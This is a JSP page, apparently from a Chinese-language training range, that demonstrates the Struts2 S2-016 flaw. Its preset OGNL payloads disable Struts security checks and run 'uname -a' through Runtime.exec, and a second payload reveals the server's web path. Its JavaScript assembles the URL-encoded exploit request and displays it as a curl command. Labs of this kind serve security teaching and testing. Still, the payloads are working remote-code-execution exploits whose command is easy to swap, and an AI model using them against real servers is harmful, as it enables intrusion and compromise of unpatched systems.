<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-016 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 1040px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea, .field input { width: 100%; box-sizing: border-box; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; color: #1d2a35; font: 14px/1.6 Consolas, monospace; }
        .field textarea { min-height: 160px; resize: vertical; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        p, li { line-height: 1.75; }

    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-016 演示靶场</h1>
        <p>这个模块演示 <code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code> 前缀在 <code>DefaultActionMapper</code> 中被当作导航参数处理时，后半段 OGNL 被执行的问题。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('uname')">执行 uname -a</button>
            <button type="button" class="preset-btn" onclick="fillPreset('webpath')">获取 Web 路径</button>
            <button type="button" class="submit-btn" onclick="runPayload()">访问当前 Payload</button>
        </div>
        <div class="field">
            <label for="prefixBox">前缀</label>
            <input id="prefixBox" value="redirect:"/>
        </div>
        <div class="field">
            <label for="payloadBox">OGNL Payload</label>
            <textarea id="payloadBox">${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(new java.lang.String(#d)),#genxor.flush(),#genxor.close()}</textarea>
        </div>
        <pre id="preview"></pre>
    </div>
</div>
<script>
    const payloads = {
        uname: '${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(new java.lang.String(#d)),#genxor.flush(),#genxor.close()}',
        webpath: "${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter(),#ot.print('web path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}"
    };
    function strictEncode(value) {
        return encodeURIComponent(value).replace(/[!'()*]/g, function(char) {
            return '%' + char.charCodeAt(0).toString(16).toUpperCase();
        });
    }
    function fillPreset(key) {
        document.getElementById('payloadBox').value = payloads[key];
        refreshPreview();
    }
    function buildUrl() {
        return 'index.action?' + strictEncode(document.getElementById('prefixBox').value + document.getElementById('payloadBox').value);
    }
    function refreshPreview() {
        document.getElementById('preview').textContent = 'curl -i "http://宿主机IP:9957/' + buildUrl() + '"';
    }
    function runPayload() { location.href = buildUrl(); }
    document.getElementById('prefixBox').addEventListener('input', refreshPreview);
    document.getElementById('payloadBox').addEventListener('input', refreshPreview);
    refreshPreview();
</script>
</body>
</html>
